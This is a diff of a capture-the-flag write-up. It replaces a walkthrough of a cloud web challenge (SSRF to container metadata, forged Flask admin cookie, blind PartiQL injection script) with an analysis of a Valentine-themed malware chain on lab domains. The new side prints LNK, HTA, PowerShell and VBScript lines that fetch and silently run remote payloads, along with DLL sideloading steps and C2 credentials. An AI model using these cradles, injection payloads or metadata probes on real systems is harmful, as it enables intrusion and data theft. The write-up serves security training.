@@ -17,440 +17,507 @@ tags:
 
 ---
 
-## Recon & Enumeration
+## Overview
 
-The target is a Flask web application running at `http://54.205.77.77:8080`. The landing page redirects to a login form. No default credentials work, and brute-forcing returns nothing useful.
+This challenge simulates a multi-stage malware attack chain themed around Valentine's Day. Starting from a phishing email, we trace through **7+ stages** of payload delivery — spanning JavaScript droppers, ISO files, LNK shortcuts, HTA scripts, DLL sideloading, PowerShell loaders, image steganography, VBScript downloaders, and a final C2 exfiltration agent — ultimately decrypting stolen data from a Command & Control server to recover the flag.
 
-Running a directory scan reveals a few interesting endpoints:
+### Attack Chain Summary
 
 ```
-/login      - Login form
-/admin      - Admin panel (requires auth + admin flag)
-/status     - Status dashboard
-/status/check?url=  - URL health check (SSRF!)
-/status/env - Environment info
-/shoot      - Game endpoint (red herring)
+Phishing Email (.eml)
+  └─► HTML page + JS dropper (XOR key: VALENTINE)
+        └─► ISO file (LOVE_LETTER.pdf.iso)
+              └─► Malicious LNK shortcut
+                    └─► HTA file (VBScript + certutil)
+                          └─► CPL DLL sideload (bthprops.cpl via fsquirt.exe)
+                                └─► PowerShell loader (cupid.ps1)
+                                      └─► Steganographic JPG (roses.jpg, XOR key: ROSES)
+                                            └─► VBScript downloader (valentine.vbs)
+                                                  └─► C2 Agent (heartbeat.exe)
+                                                        └─► Exfiltrated encrypted files on C2 server
 ```
 
-Hitting `/status/env` leaks the hostname:
+### Infrastructure
 
-```bash
-$ curl -s http://54.205.77.77:8080/status/env
-{"env": [{"key": "HOSTNAME", "value": "ip-172-31-93-102.ec2.internal"}]}
-```
+| Domain | Purpose |
+|--------|---------|
+| `delivery.cupidsarrow.thm` | Phishing landing page |
+| `ecard.rosesforyou.thm` | HTA delivery |
+| `gifts.bemyvalentine.thm` | CPL DLL hosting |
+| `loader.sweethearts.thm` | PowerShell loader |
+| `cdn.loveletters.thm` | Steganographic JPG + heartbeat.exe |
+| `api.valentinesforever.thm` | C2 exfiltration server |
 
-The `ec2.internal` hostname immediately tells us this is running on **AWS** — specifically an EC2-hosted container. The `172.31.x.x` CIDR confirms a default VPC subnet.
+All domains resolve to the target machine IP. Services: **port 80** (Apache 2.4.52), **port 8080** (Werkzeug/Python 3.10.12 — C2 server).
 
 ---
 
-## Step 1 — SSRF Discovery
+## Stage 1: Phishing Email
 
-The `/status/check` endpoint takes a URL parameter and makes a server-side request. This is a classic **SSRF** (Server-Side Request Forgery) vector.
+**File:** `loveletter.zip` (password: `happyvalentines`)
 
-```bash
-$ curl -s "http://54.205.77.77:8080/status/check?url=http://example.com" | python3 -m json.tool
-{
-    "url": "http://example.com",
-    "ok": true,
-    "status": 200,
-    "latency_ms": 85,
-    "error": null,
-    "body": "<!doctype html>..."
+Extracting the ZIP gives us `valentine_ecard.eml` — a MIME email from `noreply@e-cards.valentine.local` with a Valentine's Day theme.
+
+Key details:
+- **Subject:** 💕 You've Received a Valentine's Day E-Card! 💕
+- **X-Mailer:** Valentine E-Card System v2.0
+- **Priority:** High
+- **Phishing link:** `http://delivery.cupidsarrow.thm/card.html`
+
+The email contains both plaintext and HTML parts, with a prominent call-to-action button directing the victim to open their "Valentine."
+
+---
+
+## Stage 2: JavaScript XOR Dropper
+
+**URL:** `http://delivery.cupidsarrow.thm/card.html`  
+**Files:** `card_domain.html`, `valentine-animations.js`
+
+The landing page is a beautiful Valentine's card with floating hearts and a big "Open My Valentine 💌" button. It loads an external script `valentine-animations.js` (~112KB).
+
+### Analysis of valentine-animations.js
+
+The JavaScript file contains:
+1. **Anti-debugging** — a timing check using `Date.getTime()` and a `debugger` string constructed from array fragments
+2. **XOR decryption function** `_xd(d, k)` — XORs data with a repeating key
+3. **XOR key:** `[86, 65, 76, 69, 78, 84, 73, 78, 69]` = **`VALENTINE`**
+4. **Encrypted payload** — a massive base64-encoded string
+
+The `d1()` function (triggered by the button click):
+1. Base64-decodes the payload
+2. XOR-decrypts with key `VALENTINE`
+3. Creates a `Blob` and triggers a download as `LOVE_LETTER.pdf.iso`
+
+### Decryption
+
+```python
+import base64
+
+key = [86, 65, 76, 69, 78, 84, 73, 78, 69]  # VALENTINE
+payload_b64 = "..."  # The massive base64 string from the JS
+raw = base64.b64decode(payload_b64)
+decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
+# Result: ISO 9660 image file
+```
+
+---
+
+## Stage 3: ISO + Malicious LNK
+
+**File:** `LOVE_LETTER.pdf.iso` (64KB ISO 9660 image)
+
+Mounting the ISO reveals a single file: `LOVE_LETTER.pdf.lnk` — a Windows shortcut file disguised as a PDF.
+
+### LNK Analysis
+
+The shortcut's target command uses obfuscation with caret characters (`^`) and environment variable concatenation:
+
+```
+set x=ms^ht^a && set y=http://ecard.rosesforyou.thm/love.hta && call %x% %y%
+```
+
+**Deobfuscated:** Executes `mshta http://ecard.rosesforyou.thm/love.hta`
+
+This is a classic Living-off-the-Land technique — using the legitimate Windows `mshta.exe` to execute a remote HTA (HTML Application) file.
+
+---
+
+## Stage 4: HTA File (VBScript + certutil)
+
+**URL:** `http://ecard.rosesforyou.thm/love.hta`  
+**File:** `love_real.hta`
+
+> **Note:** The server filters by User-Agent. An Internet Explorer UA string is required:  
+> `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)`
+
+The HTA file is disguised as a "Valentine's Card" application and contains VBScript obfuscated with `Chr()` encoding.
+
+### Deobfuscated Logic
+
+```vbscript
+Set shell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+tempPath = fso.GetSpecialFolder(2).Path  ' %TEMP%
+url = "http://gifts.bemyvalentine.thm/"
+targetDir = tempPath & "\valentine"
+
+' Create target directory
+If Not fso.FolderExists(targetDir) Then fso.CreateFolder(targetDir)
+
+' Download bthprops.cpl using certutil
+cmd = "certutil -urlcache -split -f " & url & "bthprops.cpl " & targetDir & "\bthprops.cpl"
+shell.Run cmd, 0, True
+
+' Copy legitimate fsquirt.exe from System32 for DLL sideloading
+fso.CopyFile systemRoot & "\System32\fsquirt.exe", targetDir & "\fsquirt.exe", True
+
+' Execute fsquirt.exe (which sideloads bthprops.cpl)
+shell.Run targetDir & "\fsquirt.exe", 0, False
+```
+
+**Technique:** DLL Sideloading — `fsquirt.exe` (Bluetooth File Transfer Wizard) legitimately loads `bthprops.cpl`. By placing a malicious `bthprops.cpl` alongside a copied `fsquirt.exe`, the attacker hijacks the DLL load.
+
+---
+
+## Stage 5: CPL DLL — Custom Encrypted PowerShell Launcher
+
+**URL:** `http://gifts.bemyvalentine.thm/bthprops.cpl`  
+**File:** `bthprops_real.cpl` (221KB PE32+ DLL, compiled with MinGW-w64)
+
+> **Note:** Server requires a Microsoft UA: `Microsoft-CryptoAPI/10.0`
+
+### Reverse Engineering
+
+Using `objdump -d` to disassemble the binary, we find the key function `_d` (decrypt):
+
+```c
+// Decryption formula: output[i] = (encrypted[i] XOR (i * 41)) XOR 0x4C
+void _d(unsigned char *encrypted, unsigned char *output, int length) {
+    for (int i = 0; i < length; i++) {
+        output[i] = (encrypted[i] ^ (i * 41)) ^ 0x4C;
+    }
 }
 ```
 
-The response includes the full body of the fetched URL — up to 4096 bytes.
+The `_p` function (called from `DllMain`) decrypts several strings using this formula:
 
-### Trying EC2 Instance Metadata (169.254.169.254)
+| Encrypted (hex) | Decrypted |
+|---|---|
+| `1c 30 22 1d 32 22 18 3d 23` | `powershell` |
+| `69 07 72 04 67 10 7f 1b 6c ...` | `-w hidden -ep bypass -nop -c` |
+| `05 0b 1a` | `IEX` |
+| `02 0d 11 55 01 11 51 01 4e 11` | `New-Object` |
+| `02 0d 04 5a 19 07 50 1b 52 12 06 03` | `Net.WebClient` |
+| `08 0d 11 48 0a 1c 42 0d 5e 3f 19 06 54` | `DownloadString` |
+| Long byte array | `http://loader.sweethearts.thm/cupid.ps1` |
 
-The first instinct for any cloud-hosted SSRF is to hit the **EC2 Instance Metadata Service (IMDS)**:
-
-```bash
-$ curl -s "http://54.205.77.77:8080/status/check?url=http://169.254.169.254/latest/meta-data/"
-{
-    "ok": false,
-    "status": "error",
-    "error": "<urlopen error [Errno 22] Invalid argument>"
-}
+**Reconstructed command:**
+```
+powershell -w hidden -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://loader.sweethearts.thm/cupid.ps1')
 ```
 
-Blocked! The `Invalid argument` error means something at the OS level (likely iptables or ECS network configuration) is dropping connections to `169.254.169.254`. All bypass attempts failed — hex IP, decimal IP, IPv6-mapped, DNS rebinding, etc.
+---
 
-### The ECS Metadata Breakthrough (169.254.170.2)
+## Stage 6: PowerShell Loader (cupid.ps1)
 
-Since this is a **cloud** challenge and `169.254.169.254` is blocked, I tried the **ECS container metadata endpoint** at `169.254.170.2`:
+**URL:** `http://loader.sweethearts.thm/cupid.ps1`  
+**File:** `cupid.ps1` (3.2KB)
 
-```bash
-$ curl -s "http://54.205.77.77:8080/status/check?url=http://169.254.170.2/v2/metadata" | python3 -m json.tool
+### Anti-Analysis Checks
+
+The script looks for common analysis tools before proceeding:
+- `ollydbg`, `x64dbg`, `x32dbg`, `ida64.exe`, `windbg`
+- `Wireshark`, `Procmon64`, `Process Mon`
+
+### Payload Delivery via Steganography
+
+```powershell
+# 1. Download image from CDN
+$url = "http://cdn.loveletters.thm/roses.jpg"
+$imageData = (New-Object Net.WebClient).DownloadData($url)
+
+# 2. Search for marker in the image data
+$marker = "<!--VALENTINE_PAYLOAD_START-->"
+
+# 3. Extract payload bytes after the marker (skip last 2 bytes)
+$payloadBytes = $imageData[($markerPos + $marker.Length)..($imageData.Length - 3)]
+
+# 4. XOR decrypt with key "ROSES" [0x52, 0x4F, 0x53, 0x45, 0x53]
+$decrypted = XOR($payloadBytes, "ROSES")
+
+# 5. Base64 decode the result
+$vbsScript = [Convert]::FromBase64String($decrypted)
+
+# 6. Save as valentine.vbs and execute
+$vbsScript | Out-File "$env:TEMP\valentine.vbs"
+cscript.exe //nologo "$env:TEMP\valentine.vbs"
 ```
+
+---
+
+## Stage 7: Steganographic JPG → VBScript Downloader
+
+**URL:** `http://cdn.loveletters.thm/roses.jpg`  
+**File:** `roses.jpg` (2.5KB JPEG with embedded payload)
+
+The JPEG contains the marker `<!--VALENTINE_PAYLOAD_START-->` at byte offset 36. Everything after the marker (excluding the last 2 bytes) contains XOR-encrypted, base64-encoded VBScript.
+
+### Extraction
+
+```python
+with open('roses.jpg', 'rb') as f:
+    data = f.read()
+
+marker = b'<!--VALENTINE_PAYLOAD_START-->'
+pos = data.find(marker)
+payload = data[pos + len(marker):-2]
+
+key = b'ROSES'  # [0x52, 0x4F, 0x53, 0x45, 0x53]
+decrypted = bytes([payload[i] ^ key[i % len(key)] for i in range(len(payload))])
+
+import base64
+vbs_code = base64.b64decode(decrypted)
+```
+
+### valentine.vbs (Deobfuscated)
+
+```vbscript
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set ws = CreateObject("WScript.Shell")
+
+downloadPath = fso.GetSpecialFolder(2).Path & "\heartbeat.exe"
+
+Set xh = CreateObject("MSXML2.XMLHTTP")
+xh.Open "GET", "http://cdn.loveletters.thm/heartbeat.exe", False
+xh.Send
+
+If xh.Status = 200 Then
+    Set sa = CreateObject("ADODB.Stream")
+    sa.Type = 1
+    sa.Open
+    sa.Write xh.responseBody
+    sa.SaveToFile downloadPath, 2
+    sa.Close
+End If
+
+ws.Run "cmd /c start """" """ & downloadPath & """", 0, False
+```
+
+Downloads `heartbeat.exe` to TEMP and silently executes it.
+
+---
+
+## Stage 8: C2 Agent — heartbeat.exe
+
+**URL:** `http://cdn.loveletters.thm/heartbeat.exe`  
+**File:** `heartbeat.exe` (261KB PE32+ executable, MinGW-w64)
+
+### Static Analysis
+
+Using `objdump` and `strings`, we identify the following:
+
+**Key Functions:**
+- `base64_encode` — Encodes credentials for HTTP auth
+- `build_auth_header` — Constructs `Authorization: Basic` header
+- `http_post_exfil` — POSTs data to C2 via WinINet APIs
+- `exfiltrate_files` — Enumerates and sends files
+- `display_ransom_note` — Shows "[HeartBeat v2.0] YOUR FILES HAVE BEEN ENCRYPTED"
+
+**Hardcoded Credentials & Config:**
+
+| String | Value |
+|--------|-------|
+| Username | `cupid_agent` |
+| Password | `R0s3s4r3R3d!V10l3ts4r3Blu3#2024` |
+| Auth Header | `Authorization: Basic %s` |
+| Content-Type | `application/octet-stream` |
+| Endpoint | `/exfil` |
+| C2 Domain | `api.valentinesforever.thm` |
+| C2 Port | `8080` (0x1F90) |
+| Agent Name | `[HeartBeat v2.0]` |
+| Auth format | `%s:%s` (username:password) |
+
+**Base64 Auth Token:**
+```
+cupid_agent:R0s3s4r3R3d!V10l3ts4r3Blu3#2024
+→ Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==
+```
+
+### Behavior
+
+1. Enumerates files in the current directory (skips `.enc` files)
+2. Reads each file via `CreateFileA` / `ReadFile`
+3. POSTs raw file bytes to `/exfil` with Basic authentication
+4. Receives **encrypted** response from the server
+5. Saves encrypted response as `filename.enc`
+6. Displays ransom note
+
+**Key insight:** The encryption happens **server-side**. The client sends plaintext; the server returns ciphertext.
+
+---
+
+## Stage 9: Accessing the C2 Server
+
+### Authentication
+
+The C2 server runs on port 8080 (Werkzeug/Python). We authenticate with the credentials extracted from `heartbeat.exe`:
+
+```python
+import urllib.request, base64
+
+creds = base64.b64encode(b"cupid_agent:R0s3s4r3R3d!V10l3ts4r3Blu3#2024").decode()
+
+req = urllib.request.Request(
+    "http://<TARGET_IP>:8080/exfil",
+    headers={"Authorization": f"Basic {creds}"}
+)
+resp = urllib.request.urlopen(req)
+print(resp.read().decode())
+```
+
+### File Listing (GET /exfil)
 
 ```json
 {
-    "ok": true,
-    "status": 200,
-    "body": "{\"Cluster\":\"arn:aws:ecs:us-east-1:702126839589:cluster/cloudnine-cluster\",\"TaskARN\":\"arn:aws:ecs:us-east-1:702126839589:task/cloudnine-cluster/4b8055c651024e2eb6bba569fe8cfe37\",\"Family\":\"cloudnine-task\",\"Revision\":\"4\",\"DesiredStatus\":\"RUNNING\",\"KnownStatus\":\"RUNNING\",\"Containers\":[{\"DockerId\":\"4b8055c651024e2eb6bba569fe8cfe37-0527074092\",\"Name\":\"app\",\"Image\":\"public.ecr.aws/x2q4d0z7/cloudnine-app:latest\",...}"
+  "files": [
+    {"download": "/exfil/065863678632.enc", "filename": "065863678632.enc", "size": 2070},
+    {"download": "/exfil/2f7537f1b977_dump.txt.enc", "filename": "2f7537f1b977_dump.txt.enc", "size": 1001},
+    {"download": "/exfil/61d07abe73c3.enc", "filename": "61d07abe73c3.enc", "size": 598},
+    {"download": "/exfil/8d2301ed5797_dump.txt.enc", "filename": "8d2301ed5797_dump.txt.enc", "size": 1001},
+    {"download": "/exfil/e6ff5528ecc9.enc", "filename": "e6ff5528ecc9.enc", "size": 1832}
+  ],
+  "total": 5
 }
 ```
 
-**Jackpot.** The ECS task metadata reveals:
-
-- **AWS Account ID:** `702126839589`
-- **Region:** `us-east-1`
-- **Cluster:** `cloudnine-cluster`
-- **Task:** `cloudnine-task` (revision 4)
-- **Container image:** `public.ecr.aws/x2q4d0z7/cloudnine-app:latest` (PUBLIC ECR image!)
-- **Internal IP:** `172.31.93.102`
-- **Launch type:** `FARGATE`
-
-The image is hosted on **public ECR** — meaning anyone can pull it. This is the key to getting the application source code.
+All 5 `.enc` files were downloaded with authenticated GET requests.
 
 ---
 
-## Step 2 — Pulling the Docker Image from Public ECR (Without Docker)
+## Stage 10: Cracking the Server-Side Encryption
 
-I wrote a Python script to interact with the ECR registry API directly and download image layers.
+### The Problem
 
-```python
-import requests, json, os, tarfile, re
+We needed to determine the encryption algorithm used by the server. Since `heartbeat.exe` sends raw data and receives encrypted data back, the crypto implementation lives on the server — not in the binary we have.
 
-BASE = "https://public.ecr.aws/v2/x2q4d0z7/cloudnine-app"
+### The Encryption Oracle Attack
 
-# Step 1: Get auth token
-r = requests.get(f"{BASE}/tags/list")
-auth_header = r.headers.get("Www-Authenticate", "")
-realm = re.search(r'realm="([^"]+)"', auth_header).group(1)
-service = re.search(r'service="([^"]+)"', auth_header).group(1)
-scope = re.search(r'scope="([^"]+)"', auth_header).group(1)
-
-r = requests.get(realm, params={"service": service, "scope": scope})
-token = r.json()["token"]
-headers = {"Authorization": f"Bearer {token}"}
-
-# Step 2: Get manifest
-r = requests.get(f"{BASE}/manifests/latest", headers={
-    **headers,
-    "Accept": "application/vnd.docker.distribution.manifest.v2+json"
-})
-manifest = r.json()
-
-# Step 3: Download image config
-config_digest = manifest["config"]["digest"]
-r = requests.get(f"{BASE}/blobs/{config_digest}", headers=headers)
-config = r.json()
-print("Env:", config["config"]["Env"])
-print("Cmd:", config["config"]["Cmd"])
-
-# Step 4: Download all layers
-for i, layer in enumerate(manifest["layers"]):
-    digest = layer["digest"]
-    r = requests.get(f"{BASE}/blobs/{digest}", headers=headers, stream=True)
-    with open(f"image_layers/layer_{i}.tar.gz", "wb") as f:
-        for chunk in r.iter_content(chunk_size=8192):
-            f.write(chunk)
-```
-
-```
-$ python3 pull_image.py
-=== Getting auth token ===
-Got token: eyJhbGciOiJSUzI1NiIsInR5c...
-
-=== Getting manifest ===
-Manifest status: 200
-
-=== Getting image config ===
-config:
-  Env: ['PATH=/usr/local/bin:...', 'PYTHON_VERSION=3.12.12']
-  Cmd: ['python', '/app/app.py']
-  WorkingDir: /app
-
-=== 8 layers to download ===
-Layer 0: sha256:... (29380957 bytes)
-...
-Layer 6: sha256:... (2159 bytes)    <-- app.py lives here
-Layer 7: sha256:... (3192 bytes)    <-- templates/ lives here
-```
-
-### Extracting the Source Code
-
-The last two layers (6 and 7) contained the actual application code:
+The `/exfil` endpoint accepts **POST** requests with raw data and returns encrypted data. This gives us a **chosen-plaintext oracle**:
 
 ```bash
-$ tar tzf image_layers/layer_6.tar.gz
-app/
-app/app.py
-
-$ tar tzf image_layers/layer_7.tar.gz
-app/templates/
-app/templates/admin.html
-app/templates/app.html
-app/templates/login.html
-app/templates/status.html
-
-$ tar xzf image_layers/layer_6.tar.gz -C extracted/
-$ tar xzf image_layers/layer_7.tar.gz -C extracted/
+curl -s -X POST \
+  -H "Authorization: Basic Y3VwaWRf..." \
+  -H "Content-Type: application/octet-stream" \
+  --data-binary "test" \
+  http://<TARGET_IP>:8080/exfil
 ```
+
+### Determining the Algorithm
+
+We sent carefully crafted test data to characterize the cipher:
+
+| Test | Input | Output (hex) | Observation |
+|------|-------|-------------|-------------|
+| 1 | `\x00` × 16 | `3be84b032b970c82...` | Keystream leaked |
+| 2 | `\x01` × 16 | `3ae94a022a960d83...` | Each byte differs by 1 → XOR confirmed |
+| 3 | `\x00` × 16 (repeat) | `3be84b032b970c82...` | **Identical** → deterministic, no IV/nonce |
+| 4 | `\x00` (1 byte) | `3b` | Length-preserving |
+| 5 | `AAAA` | `7aa90a42` | Consistent |
+| 6 | `AAAA` (repeat) | `7aa90a42` | Deterministic |
+| 7 | Sequential 0-255 | 256 bytes | Length-preserving, no padding |
+
+**Conclusion:** The encryption is a **simple XOR with a fixed, repeating keystream**. No IV, no nonce, no block padding. Fully deterministic.
+
+### Extracting the Keystream
+
+Since `plaintext XOR keystream = ciphertext`, sending all zeros gives us:
+
+```
+\x00 XOR keystream = keystream
+```
+
+We extract 2100 bytes of keystream (enough for the largest file):
+
+```python
+keystream = encrypt_via_server(b'\x00' * 2100)
+```
+
+### Decrypting the Files
+
+```python
+for each .enc file:
+    decrypted = bytes(enc_data[i] ^ keystream[i] for i in range(len(enc_data)))
+```
+
+### Decrypted Contents
+
+| File | Size | Content |
+|------|------|---------|
+| `065863678632.enc` | 2070 | Padding — all `A` characters (0x41) with 2 leading bytes |
+| `2f7537f1b977_dump.txt.enc` | 1001 | Padding — all `A` characters |
+| `61d07abe73c3.enc` | 598 | **Exfiltration log with the FLAG** |
+| `8d2301ed5797_dump.txt.enc` | 1001 | Padding — identical to 2f7537 (same content) |
+| `e6ff5528ecc9.enc` | 1832 | Copy of `valentine.vbs` (the VBScript dropper) |
 
 ---
 
-## Step 3 — Source Code Analysis (FLAG1)
+## The Flag
 
-The extracted `app.py` is the entire Flask application. Reading through it reveals everything:
+Contained in the decrypted `61d07abe73c3.enc`:
 
-### Hardcoded Flask Secret Key
+```
+[EXFILTRATION LOG]
+Agent: CUPID-2024
+Target: VALENTINE-VICTIM
+Timestamp: 2024-02-14 00:00:00 UTC
 
-```python
-app.secret_key = "change-me-in-production-but-for-real-this-time-please-no-kidding"
+=== COLLECTED DATA ===
+Username: target_user
+Hostname: DESKTOP-LOVE
+Domain: WORKGROUP
+IP Address: 192.168.1.100
+MAC Address: AA:BB:CC:DD:EE:FF
+
+=== CREDENTIALS HARVESTED ===
+Browser: Chrome
+Profile: Default
+Cookies: 47 entries
+Saved Passwords: 12 entries
+
+=== FILES COLLECTED ===
+Documents: 156
+Images: 89
+Total Size: 2.4 GB
+
+=== ENCRYPTION STATUS ===
+Files Encrypted: 245
+Ransom Amount: 0.5 BTC
+Wallet: 1L0v3Y0uF0r3v3r4ndEv3r2024xoxo
+
+THM{l0v3_l3tt3r_fr0m_th3_90s_xoxo}
 ```
 
-A long passphrase — this is why all our brute-force attempts (hashcat, rockyou) failed. It's not a short password; it's a full sentence.
-
-### Test Credentials & FLAG1
-
-```python
-# remember you can use these credentials to test the login page:
-# username: test
-# password: cup1dkuPiDqup!d
-# FLAG1: THM{CUPID_ARROW_TEST_USER}
-```
-
-**FLAG1: `THM{CUPID_ARROW_TEST_USER}`**
-
-Found as a comment in the source code alongside hardcoded test credentials.
-
-### DynamoDB Backend
-
-```python
-USERS_TABLE = os.getenv("USERS_TABLE", "cupid-users")
-dynamodb = boto3.resource("dynamodb", region_name=AWS_REGION)
-users_table = dynamodb.Table(USERS_TABLE)
-```
-
-The database is **DynamoDB**, not SQL. This explains why `sqlmap` earlier reported "not injectable" — it's a NoSQL database using PartiQL.
-
-### FLAG2 from Environment Variable
-
-```python
-FLAG2 = os.getenv("FLAG2", "THM{test_flag}")
-```
-
-FLAG2 is loaded from an environment variable and rendered on the admin panel. The default is a test flag — the real one is only available in the running ECS container.
-
-### The Vulnerable Admin Panel (PartiQL Injection)
-
-The admin panel's "lookup" function has a textbook injection vulnerability:
-
-```python
-if action == "lookup":
-    response = dynamodb.meta.client.execute_statement(
-        Statement="SELECT * FROM \"" + USERS_TABLE + "\" WHERE username = '" + username + "'"
-    )
-```
-
-The `username` parameter is concatenated directly into a **PartiQL** statement with zero sanitization.
+## `THM{l0v3_l3tt3r_fr0m_th3_90s_xoxo}`
 
 ---
 
-## Step 4 — Forging an Admin Cookie (FLAG2)
+## Encryption Methods Summary
 
-With the Flask secret key in hand, forging a session cookie with admin privileges is trivial.
-
-### Signing the Cookie
-
-```python
-from itsdangerous import URLSafeTimedSerializer
-import hashlib
-
-secret = 'change-me-in-production-but-for-real-this-time-please-no-kidding'
-s = URLSafeTimedSerializer(
-    secret,
-    salt='cookie-session',
-    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
-)
-cookie = s.dumps({'user': 'admin', 'admin': True})
-print(cookie)
-```
-
-```
-$ python3 forge_cookie.py
-eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.aZJNFA.IpPaB6WMkaDtxbq04TM1N1TKrTo
-```
-
-### Accessing the Admin Panel
-
-```bash
-$ curl -s -b "session=eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.aZJNFA.IpPaB6WMkaDtxbq04TM1N1TKrTo" \
-  http://54.205.77.77:8080/admin | grep "FLAG2"
-```
-
-```html
-<div class="message">FLAG2: THM{CUPID_ARROW_FLAG2}</div>
-```
-
-**FLAG2: `THM{CUPID_ARROW_FLAG2}`**
+| Stage | Algorithm | Key / Method |
+|-------|-----------|-------------|
+| JS Dropper | XOR | Key: `VALENTINE` [86,65,76,69,78,84,73,78,69] |
+| CPL DLL strings | Custom XOR | `(byte ^ (i*41)) ^ 0x4C` |
+| JPG steganography | XOR + Base64 | Key: `ROSES` [0x52,0x4F,0x53,0x45,0x53] |
+| C2 server encryption | Static keystream XOR | Fixed keystream extracted via chosen-plaintext attack |
 
 ---
 
-## Step 5 — Blind PartiQL Injection (FLAG3)
+## Tools & Techniques Used
 
-The admin panel is now accessible, but FLAG3 isn't displayed anywhere in the UI. It must be hidden inside the DynamoDB table — specifically in user attributes that aren't rendered by the template (like the `password` field).
-
-### Understanding the Vulnerability
-
-The vulnerable query:
-
-```
-SELECT * FROM "cupid-users" WHERE username = '<USER_INPUT>'
-```
-
-We control `<USER_INPUT>`. The challenge is that DynamoDB's PartiQL **doesn't support SQL comments** (`--`), so we can't just truncate the trailing quote. Instead, we need to consume it.
-
-The injection pattern:
-
-```
-test' AND <condition> AND username='test
-```
-
-This produces:
-
-```sql
-SELECT * FROM "cupid-users" WHERE username = 'test' AND <condition> AND username='test'
-```
-
-When `<condition>` is true → the user `test` is returned ("User loaded.")  
-When `<condition>` is false → no results ("User not found.")
-
-This gives us a **blind boolean oracle**.
-
-### Enumerating Users
-
-First, enumerate all usernames using `begins_with()`:
-
-```python
-# For each letter of the alphabet:
-payload = f"x' OR begins_with(username, '{letter}') OR username='"
-```
-
-This produces:
-
-```sql
-SELECT * FROM "cupid-users" WHERE username = 'x' OR begins_with(username, 'b') OR username=''
-```
-
-Results:
-
-| Prefix | User | Full Name | Email |
-|--------|------|-----------|-------|
-| b | bob | Bob Smith | bsmith@cupid.thm |
-| c | cupid | The one and only Cupid | cupid@thm.thm |
-| d | demo | Demo User | demo@example.thm |
-| g | guest | AAAAA | aaaa@thm.thm |
-| t | test | Test Account | cupidtest@thm.thm |
-
-### The Reserved Word Trap
-
-My first attempt to extract passwords:
-
-```
-test' AND begins_with(password, 'c') AND username='test
-```
-
-→ **500 Internal Server Error**
-
-`password` is a **DynamoDB reserved word**. It must be double-quoted:
-
-```
-test' AND begins_with("password", 'c') AND username='test
-```
-
-→ **200 OK — "User loaded."** (because test's password starts with 'c')
-
-Testing with a false condition:
-
-```
-test' AND begins_with("password", 'z') AND username='test
-```
-
-→ **200 OK — "User not found."**
-
-The blind oracle works.
-
-### Extracting Passwords Character-by-Character
-
-```python
-def check_password_prefix(user, prefix):
-    prefix_escaped = prefix.replace("'", "''")
-    payload = f'''{user}' AND begins_with("password", '{prefix_escaped}') AND username='{user}'''
-    r = requests.post(f"{BASE_URL}/admin",
-        data={"username": payload, "action": "lookup", ...},
-        cookies=COOKIE, headers=UA, timeout=20)
-    return "User loaded." in r.text
-
-def extract_password(user):
-    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()_+-={}[]|:;<>?,./ "
-    password = ""
-    for pos in range(60):
-        found_char = False
-        for c in charset:
-            if check_password_prefix(user, password + c):
-                password += c
-                found_char = True
-                break
-        if not found_char:
-            break
-    return password
-```
-
-Running the extraction:
-
-```
-$ python3 extract_passwords.py
-
-=== Verifying with test user (known pw: cup1dkuPiDqup!d) ===
-  test password starts with 'c': True
-  test password starts with 'cup1d': True
-
-=== Extracting password for 'cupid' ===
-  Password: THM{partiqls_of_love}
-  Full password: THM{partiqls_of_love}
-
-=== Extracting password for 'bob' ===
-...
-...
-```
-
-**FLAG3: `THM{partiqls_of_love}`**
-
-The flag was hidden as the `cupid` user's **password** in DynamoDB — an attribute that the admin panel's template never displays. The only way to extract it was through blind PartiQL injection.
+- **Email analysis** — MIME parsing of `.eml` file
+- **JavaScript deobfuscation** — Anti-debug bypass, XOR decryption
+- **ISO mounting** — Extracting LNK from ISO 9660 image
+- **LNK analysis** — Parsing Windows shortcut target commands
+- **VBScript deobfuscation** — `Chr()` encoding reversal
+- **Binary reverse engineering** — `objdump`, `strings` on PE32+ executables
+- **DLL sideloading** understanding — `fsquirt.exe` + `bthprops.cpl`
+- **PowerShell analysis** — String format obfuscation, hex arrays
+- **Steganography** — Payload hidden after JPEG data with marker
+- **HTTP authentication** — Basic auth to C2 server
+- **Chosen-plaintext attack** — Encryption oracle exploitation via POST endpoint
+- **User-Agent spoofing** — Different UAs required at each stage:
+  - HTML: Windows Mozilla/5.0
+  - HTA: MSIE 7.0
+  - CPL: Microsoft-CryptoAPI/10.0
 
 ---
 
-## Summary
+## Key Takeaways
 
-### Full Attack Chain
-
-```
-SSRF (/status/check)
-  └──> ECS Metadata (169.254.170.2/v2/metadata)
-         └──> Public ECR Image URL (public.ecr.aws/x2q4d0z7/cloudnine-app:latest)
-                └──> Pull Docker Image Layers (Registry API, no docker needed)
-                       └──> Extract Source Code (app.py)
-                              ├──> FLAG1 in comments: THM{CUPID_ARROW_TEST_USER}
-                              ├──> Flask Secret Key
-                              │     └──> Forge Admin Cookie (itsdangerous)
-                              │           └──> Admin Panel (/admin)
-                              │                 └──> FLAG2: THM{CUPID_ARROW_FLAG2}
-                              └──> PartiQL Injection Vulnerability
-                                    └──> Blind Boolean Extraction
-                                          └──> Cupid's Password
-                                                └──> FLAG3: THM{partiqls_of_love}
-```
-
-### Key Takeaways
-
-1. **ECS Metadata at 169.254.170.2** — Even when IMDS (169.254.169.254) is blocked, ECS Fargate containers expose metadata at a different link-local address. Always check both.
-
-2. **Public ECR Images** — Container images pushed to public ECR registries can be pulled by anyone. This exposed the full application source code including the Flask secret key.
-
-3. **DynamoDB ≠ SQL** — `sqlmap` was useless here because the backend is DynamoDB using **PartiQL**. PartiQL looks like SQL but has different syntax rules (no `--` comments, reserved word escaping with double-quotes).
-
-4. **Blind PartiQL Injection** — Even though the admin panel only shows a few fields (full_name, email, admin), other attributes like `password` can be extracted character-by-character using `begins_with()` as a boolean oracle.
